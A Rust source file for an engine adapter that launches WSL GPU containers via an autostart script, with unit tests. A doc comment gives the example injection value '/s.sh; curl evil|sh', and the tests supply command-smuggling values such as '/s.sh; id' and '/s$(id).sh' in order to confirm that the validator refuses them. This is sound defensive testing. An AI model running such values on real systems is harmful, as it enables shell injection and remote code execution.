//! The ninfer engine adapter (DESIGN Step 7; port of the working v3.3 path).
//!
//! Ninfer engines are GPU containers living inside WSL: the harness spawns only
//! a short-lived `wsl.exe` client that runs the model's `autostart.sh` (the
//! operator's script, positional contract: `$1` profile, `$2` key|nokey,
//! `$3` host-publish port). Because the container outlives that client, the
//! spec carries the container name so the runtime reaps it with
//! `docker rm -f` on release (v3.3 `Proc::Container` parity), and readiness
//! chains `/health` then `/v1/models` (v3.3 `wait_ready`; SE's `Then` probes
//! both, unlike v3.3's first-step-only unwrap).
//!
//! Every ninfer model the catalog carries is managed: the operator's 2026-10-26
//! call scrapped v3.3's `external: true` so the former bonsai servers are loaded
//! and reaped here like any other. The port comes from the harness's slot plan but
//! reaches the container only as the script's `$3` **offer** — whether the
//! autostart script publishes there is the operator's contract, unverifiable from
//! here (FINDINGS-10 [5]); the harness's own evidence is that its readiness probes
//! answer on that port, nothing more.

use super::{EngineAdapter, EngineError, LaunchSpec, ReadinessSpec};
use crate::model::ModelEntry;
use crate::ownership::{valid_container_name, NINFER_ENGINE};
use std::collections::BTreeMap;

/// Defaults matching v3.3 `appconf` (operator-owned WSL coordinates).
#[derive(Debug, Clone)]
pub struct NinferDefaults {
    /// WSL distro hosting the containers.
    pub wsl_distro: String,
    /// WSL user owning the containers and autostart scripts.
    pub wsl_user: String,
}

/// Ninfer adapter: WSL container launched via the model's autostart script.
#[derive(Debug, Clone)]
pub struct NinferAdapter {
    /// WSL coordinates, wired from config at boot.
    pub defaults: NinferDefaults,
}

/// Whether `value` is safe to hand to WSL as a single word: the argv after
/// `wsl.exe --` is re-tokenized by the login shell there, so a yaml value such as
/// `/s.sh; curl evil|sh` would otherwise execute inside the distro (security
/// review, 2026-10-26). Paths and profile names are plain words, never options.
///
/// `~` is deliberately NOT admitted anywhere in a word (FINDINGS2-0910 [6]): bash
/// expands a leading `~` before it ever opens the file, so `~root/x.sh` would reach
/// `/root/x.sh` and `~/x.sh` the wsl_user's home — a yaml word that looks like an
/// absolute path in the catalog but names a file the operator did not write. The
/// rule is the character class rather than bash's expansion positions: an interior
/// `~` (inert to the shell) is refused too, deliberately, so one charset is the
/// whole story. Every autostart path in the live catalog is already absolute
/// (`/home/...`), and profile words never need it. What this rule still does NOT do
/// is bound *which* absolute paths are admissible: the distro-side root allow-list
/// is the ninfer `custody_roots` cell of chunk 10's `EnginePolicy` row.
fn valid_word(value: &str) -> bool {
    !value.is_empty()
        && !value.starts_with('-')
        && value.chars().all(|c| {
            c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '+' | '@')
        })
}

impl NinferAdapter {
    /// Creates the adapter with the config's WSL coordinates.
    pub fn new(wsl_distro: impl Into<String>, wsl_user: impl Into<String>) -> Self {
        NinferAdapter {
            defaults: NinferDefaults {
                wsl_distro: wsl_distro.into(),
                wsl_user: wsl_user.into(),
            },
        }
    }

    /// The autostart argv exactly as v3.3 built it: shared WSL client prefix,
    /// then bash, script, profile, key flag, and the port offered as `$3` — the
    /// harness's slot-plan port, which the script decides whether to publish
    /// (the header's offer/contract sentence; 10[5]).
    fn argv(&self, script: &str, profile: &str, key: &str, port: u16) -> Vec<String> {
        let mut argv =
            crate::engine::wsl_prefix(&self.defaults.wsl_distro, &self.defaults.wsl_user);
        argv.extend([
            "bash".to_string(),
            script.to_string(),
            profile.to_string(),
            key.to_string(),
            port.to_string(),
        ]);
        argv
    }
}

impl EngineAdapter for NinferAdapter {
    fn engine_id(&self) -> &str {
        NINFER_ENGINE
    }

    fn spec(&self, model: &ModelEntry, port: u16) -> Result<LaunchSpec, EngineError> {
        let rejected = |reason: String| EngineError::Rejected {
            engine: NINFER_ENGINE.to_string(),
            model: model.name.clone(),
            reason,
        };
        // The WSL account is operator-specific and has no shipped default (config
        // review, 2026-10-26): refuse with the field named rather than hand `wsl.exe`
        // an empty `-u` and let the spawn fail obscurely.
        if self.defaults.wsl_user.trim().is_empty() {
            return Err(rejected(
                "`wsl_user` is not set in the config file: name the WSL account that owns \
                 these containers"
                    .to_string(),
            ));
        }
        // Both required, exactly as v3.3 refused them at launch; the script path
        // lives inside WSL and cannot be existence-checked from here.
        let missing = |field: &str| EngineError::MissingField {
            model: model.name.clone(),
            field: field.to_string(),
        };
        let script = model
            .raw
            .get("ninfer_autostart")
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
            .ok_or_else(|| missing("ninfer_autostart"))?;
        if !valid_word(&script) {
            return Err(rejected(format!(
                "ninfer_autostart must be a plain WSL path (no spaces, no shell \
                 metacharacters, no leading `~`): {script}"
            )));
        }
        let container = model
            .raw
            .get("ninfer_container")
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
            .ok_or_else(|| missing("ninfer_container"))?;
        if !valid_container_name(&container) {
            return Err(rejected(format!(
                "ninfer_container must be a docker name (alphanumeric start, \
                 [A-Za-z0-9._-] only, never a container-ID shape): {container}"
            )));
        }
        let profile = model
            .raw
            .get("ninfer_profile")
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
            .unwrap_or_else(|| "b".to_string());
        if !valid_word(&profile) {
            return Err(rejected(format!(
                "ninfer_profile must be a plain word (no spaces or shell metacharacters): {profile}"
            )));
        }
        let key = if model
            .raw
            .get("ninfer_key")
            .map(String::as_str)
            .is_some_and(crate::model::truthy)
        {
            "key"
        } else {
            "nokey"
        };
        Ok(LaunchSpec {
            argv: self.argv(&script, &profile, key, port),
            // The client's cwd is irrelevant: everything runs inside WSL.
            cwd: std::env::temp_dir(),
            env: BTreeMap::new(),
            log_name: model.name.clone(),
            readiness: ReadinessSpec::Then(
                Box::new(ReadinessSpec::Http {
                    path: "/health".to_string(),
                    expect_status: 200,
                }),
                Box::new(ReadinessSpec::Http {
                    path: "/v1/models".to_string(),
                    expect_status: 200,
                }),
            ),
            container: Some(container.to_string()),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::CategoryId;
    use crate::model::CostClass;

    fn raw(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect()
    }

    fn entry(pairs: &[(&str, &str)]) -> ModelEntry {
        let mut pairs: Vec<(&str, &str)> = pairs.to_vec();
        pairs.push(("name", "ninfer-test"));
        ModelEntry {
            name: "ninfer-test".to_string(),
            engine: "ninfer".to_string(),
            category: CategoryId::Work,
            vram_gb: Some(34.0),
            gguf_size_gb: None,
            cost: CostClass::Fixed,
            launch_floor_gb: None,
            load_timeout_s: Some(600),
            measured_gb: None,
            measured_min_gb: None,
            measured_offload: None,
            model_ref: Some("ninfer://ninfer-x:8004/served".to_string()),
            serve_model: Some("served".to_string()),
            file: None,
            raw: raw(&pairs),
        }
    }

    #[test]
    fn spec_refuses_by_naming_wsl_user_when_the_account_is_unset() {
        // No username ships as a default, so the load has to explain the fix rather
        // than hand `wsl.exe` an empty `-u` and fail obscurely.
        let err = NinferAdapter::new("Ubuntu", "")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/home/u/guide/ninfer-x/autostart.sh"),
                    ("ninfer_container", "ninfer-x"),
                ]),
                18109,
            )
            .expect_err("a blank account cannot launch");
        assert!(err.to_string().contains("wsl_user"), "was: {err}");
    }

    #[test]
    fn argv_matches_the_v33_positional_contract() {
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/home/u/guide/ninfer-x/autostart.sh"),
                    ("ninfer_container", "ninfer-x"),
                ]),
                18109,
            )
            .expect("valid spec");
        assert_eq!(
            spec.argv,
            vec![
                "wsl.exe",
                "-d",
                "Ubuntu",
                "-u",
                "ops",
                "--",
                "bash",
                "/home/u/guide/ninfer-x/autostart.sh",
                "b",
                "nokey",
                "18109",
            ]
        );
        assert_eq!(spec.log_name, "ninfer-test");
        assert_eq!(spec.container.as_deref(), Some("ninfer-x"));
        assert_eq!(
            spec.readiness,
            ReadinessSpec::Then(
                Box::new(ReadinessSpec::Http {
                    path: "/health".to_string(),
                    expect_status: 200,
                }),
                Box::new(ReadinessSpec::Http {
                    path: "/v1/models".to_string(),
                    expect_status: 200,
                }),
            )
        );
    }

    #[test]
    fn profile_and_key_flags_pass_through() {
        let spec = NinferAdapter::new("U2", "usr")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/s.sh"),
                    ("ninfer_container", "c"),
                    ("ninfer_profile", "a"),
                    ("ninfer_key", "true"),
                ]),
                18110,
            )
            .expect("valid spec");
        assert_eq!(
            spec.argv[2..],
            ["U2", "-u", "usr", "--", "bash", "/s.sh", "a", "key", "18110"]
        );
    }

    /// Pin of the `cpu_offload` engine scoping: the ninfer adapter reads only
    /// `ninfer_autostart`/`ninfer_container`/`ninfer_profile`/`ninfer_key` — the
    /// key is inert for this engine, so absent, `true` and `false` must produce a
    /// byte-identical [`LaunchSpec`] (argv, env, readiness, cwd, container alike).
    /// Falsifier: if this adapter starts reading the key, the equality fails here.
    #[test]
    fn cpu_offload_changes_nothing_for_a_ninfer_launch() {
        let base = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", "c")]),
                18109,
            )
            .expect("absent key");
        for value in ["true", "false"] {
            let spec = NinferAdapter::new("Ubuntu", "ops")
                .spec(
                    &entry(&[
                        ("ninfer_autostart", "/s.sh"),
                        ("ninfer_container", "c"),
                        ("cpu_offload", value),
                    ]),
                    18109,
                )
                .expect("an inert key never refuses a launch");
            assert_eq!(
                spec, base,
                "cpu_offload: {value} must change nothing — if the ninfer adapter \
                 starts reading the key, this fails"
            );
        }
    }

    #[test]
    fn missing_required_keys_are_refusals_not_panic() {
        let err = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&[("ninfer_container", "c")]), 18109)
            .expect_err("must refuse");
        match err {
            EngineError::MissingField { field, .. } => assert_eq!(field, "ninfer_autostart"),
            other => panic!("expected a MissingField refusal, got {other:?}"),
        }
        let err = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&[("ninfer_autostart", "/s.sh")]), 18109)
            .expect_err("must refuse");
        match err {
            EngineError::MissingField { field, .. } => assert_eq!(field, "ninfer_container"),
            other => panic!("expected a MissingField refusal, got {other:?}"),
        }
    }

    /// FINDINGS2-0910 [6]: `~` is shell-active at a word start, so the login shell
    /// that re-tokenizes everything after `wsl.exe --` would expand `~root/x.sh` to
    /// `/root/x.sh` and `~/x.sh` to the wsl_user's home — a yaml word that reads
    /// like an absolute path but names a file the operator never wrote. Both
    /// autostart and profile words are held to the same rule; the live catalog's
    /// paths are all absolute, so nothing legitimate depends on `~`.
    #[test]
    fn tilde_expanding_words_are_refused() {
        for script in ["~root/guide/x/autostart.sh", "~/autostart.sh", "~"] {
            let reason = refused(&[("ninfer_autostart", script), ("ninfer_container", "c")]);
            assert!(reason.contains("plain WSL path"), "{script}: {reason}");
        }
        let reason = refused(&[
            ("ninfer_autostart", "/s.sh"),
            ("ninfer_container", "c"),
            ("ninfer_profile", "~b"),
        ]);
        assert!(reason.contains("ninfer_profile"), "{reason}");
        // The rule is the character class, not a simulation of bash's expansion
        // positions: an interior `~` (inert to bash, legal as a filename) is refused
        // too. Deliberately stricter — one charset, no shell-context reasoning
        // required of the next reader — and no live autostart path needs it.
        let reason = refused(&[
            ("ninfer_autostart", "/home/u/a~b/autostart.sh"),
            ("ninfer_container", "c"),
        ]);
        assert!(reason.contains("plain WSL path"), "{reason}");
    }

    #[test]
    fn external_key_is_inert_now() {
        // Operator call 2026-10-26 scrapped `external: true`: a copied-back v3.3
        // yaml must be managed, not refused — the key carries no meaning here.
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/s.sh"),
                    ("ninfer_container", "c"),
                    ("external", "true"),
                ]),
                18109,
            )
            .expect("managed");
        assert_eq!(spec.container.as_deref(), Some("c"));
    }

    /// The reason one hostile `raw` value earns, or a panic naming a value that was
    /// wrongly admitted (the three shape rules share one refusal voice, so the tests
    /// share one probe).
    fn refused(pairs: &[(&str, &str)]) -> String {
        match NinferAdapter::new("Ubuntu", "ops").spec(&entry(pairs), 18109) {
            Err(EngineError::Rejected { reason, engine, .. }) => {
                assert_eq!(engine, NINFER_ENGINE);
                reason
            }
            other => panic!("expected a Rejected refusal, got {other:?}"),
        }
    }

    #[test]
    fn option_and_shell_shaped_values_are_refused_before_argv() {
        // The argv after `wsl.exe --` is re-tokenized by the login shell inside the
        // distro, so a yaml value is only safe as a plain word (security review,
        // 2026-10-26): option-shaped, spaced and metacharacter-bearing values die here.
        for bad in ["-c", "/s.sh; id", "/s$(id).sh", "/s.sh|sh", "/a b.sh"] {
            let reason = refused(&[("ninfer_autostart", bad), ("ninfer_container", "c")]);
            assert!(reason.contains("plain WSL path"), "{bad}: {reason}");
        }
        let reason = refused(&[
            ("ninfer_autostart", "/s.sh"),
            ("ninfer_container", "c"),
            ("ninfer_profile", "b; id"),
        ]);
        assert!(reason.contains("ninfer_profile"), "{reason}");
        for name in ["-v", "_x", "a b"] {
            let reason = refused(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", name)]);
            assert!(reason.contains("docker name"), "{name}: {reason}");
        }
    }

    #[test]
    fn container_names_docker_could_resolve_as_an_id_are_refused() {
        // Chunk 10 [4]: `docker rm -f <hex>` is resolved as a container-**ID prefix**, so
        // a name of that shape must die here — the same validator the boot reclaim and
        // the claim ledger use — before it can reach the pre-reap argv and delete an
        // unrelated container in the operator's distro.
        for name in ["1234abc", "beef", "deadbeef"] {
            let reason = refused(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", name)]);
            assert!(reason.contains("docker name"), "{name}: {reason}");
        }
        assert_eq!(
            NinferAdapter::new("Ubuntu", "ops")
                .spec(
                    &entry(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", "c")]),
                    18109,
                )
                .expect("a short name is not an id shape")
                .container
                .as_deref(),
            Some("c"),
            "a one-character hex name must still load: the load path stays intact"
        );
    }

    #[test]
    fn key_flag_uses_the_shared_truthy_table() {
        for value in ["true", "1", "yes", "on"] {
            let spec = NinferAdapter::new("Ubuntu", "ops")
                .spec(
                    &entry(&[
                        ("ninfer_autostart", "/s.sh"),
                        ("ninfer_container", "c"),
                        ("ninfer_key", value),
                    ]),
                    18109,
                )
                .expect("valid spec");
            assert_eq!(spec.argv[9], "key", "ninfer_key: {value}");
        }
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/s.sh"),
                    ("ninfer_container", "c"),
                    ("ninfer_key", "off"),
                ]),
                18109,
            )
            .expect("valid spec");
        assert_eq!(spec.argv[9], "nokey");
    }
}
